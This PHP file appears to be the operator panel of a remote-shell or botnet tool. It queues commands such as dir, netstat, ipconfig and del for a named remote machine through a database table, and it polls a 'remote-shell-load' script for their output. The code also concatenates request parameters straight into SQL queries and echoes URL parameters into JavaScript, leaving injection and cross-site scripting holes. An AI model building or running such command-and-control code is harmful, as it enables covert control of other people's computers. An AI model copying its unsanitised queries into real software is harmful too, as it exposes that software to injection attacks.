<?php
	include("chk.php");
?>
<?php
	if(isset($_POST['run']))
	{
				include("pinc-nullorder.php");
				include("../config.php");
				saveorder(3);
				$con=mysqli_connect($host,$user,$pass,$db);
					mysqli_query($con,"update bcommand set sinput='".$_POST['command']."' ,soutput='".readcommand()."\n->".$_POST['command']."' where sname='".$_GET['user']."'");
				mysqli_close($con);
	}
	if(isset($_POST['cls']))
	{
				include("../config.php");
				$con=mysqli_connect($host,$user,$pass,$db);
					mysqli_query($con,"update bcommand set sinput='' ,soutput='' where sname='".$_GET['user']."'");
				mysqli_close($con);
	}
	function readcommand()
	{
					include("../config.php");
					$con=mysql_connect($host,$user,$pass);
					mysql_select_db($db,$con);
					$sel=mysql_query("select * from bcommand where sname='".$_GET['user']."'");
					$row=mysql_fetch_array($sel);
					return $row['soutput'];
	}
?>
<script type="text/javascript">
    $(document).ready(function(){
      refreshoutput();
    });

    function refreshoutput(){
        $('#output').load('inc/pinc-remote-shell-load.php?user=<?php echo $_GET["user"]."&pass=".$_GET["pass"];?>', function(){
           setTimeout(refreshoutput, 3000);
        });
    }
	function dbcommand()
	{
		document.getElementById("command").value=document.getElementById("dbc").value;
	}
</script>
<form action="" method="post">
	<pre style="width:100%;height:86%"  id="output"></pre>
		 <select class="form-control" style="width:10%" onchange="dbcommand()" id="dbc">
			<option>dir</option>
			<option>netstat</option>
			<option>cd</option>
			<option>ipconfig</option>
			<option>del</option>
			<option>mkdir</option>
			
		 </select>
		  <input type="text" class="form-control" style="width:79%" name="command" id="command">
			<input class="btn btn-primary" type="submit" value="Run" name="run">
			<input class="btn btn-primary" type="submit" value="Cls" name="cls">
</form>